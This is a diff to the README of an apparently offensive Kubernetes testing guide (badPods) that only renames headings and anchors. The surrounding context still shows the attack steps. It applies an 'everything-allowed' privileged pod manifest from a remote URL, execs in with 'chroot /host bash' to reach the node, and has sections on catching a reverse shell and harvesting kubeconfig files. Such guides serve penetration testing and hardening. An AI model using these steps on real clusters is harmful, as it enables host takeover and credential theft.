@@ -6,8 +6,8 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 
 ## Table of Contents
 * [Pod Creation & Access](#Pod-Creation-&-Access)
-   * [Create one or more of these resource types and exec into the pod](#Create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
-   * [Create one or more of these resources and catch reverse shell](#Create-one-or-more-of-these-resources-and-catch-reverse-shell)
+   * [Exec Pods: Create one or more of these resource types and exec into the pod](#exec-pods-create-one-or-more-of-these-resource-types-and-exec-into-the-pod)
+   * [Reverse Shell Pods: Create one or more of these resources and catch reverse shell](#reverse-shell-pods-Create-one-or-more-of-these-resources-and-catch-reverse-shell)
    * [Deleting Resources](#Deleting-Resources)
 * [Post exploitation](#Post-exploitation)
    * [Look for kubeconfig's in the host filesystem](#Look-for-kubeconfig's-in-the-host-filesystem) 
@@ -18,7 +18,7 @@ The pod you create mounts the host’s filesystem to the pod. You’ll have the 
 
 # Pod Creation & Access
 
-## Create one or more of these resource types and exec into the pod
+## Exec Pods: Create one or more of these resource types and exec into the pod
 **Pod**  
 ```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
@@ -68,7 +68,7 @@ kubectl get pods | grep everything-allowed-exec-daemonset
 kubectl exec -it everything-allowed-exec-daemonset-[ID] -- chroot /host bash
 ```
 
-## Create one or more of these resources and catch reverse shell
+## Reverse Shell Pods: Create one or more of these resources and catch reverse shell
 
 Set up listener
 ```bash
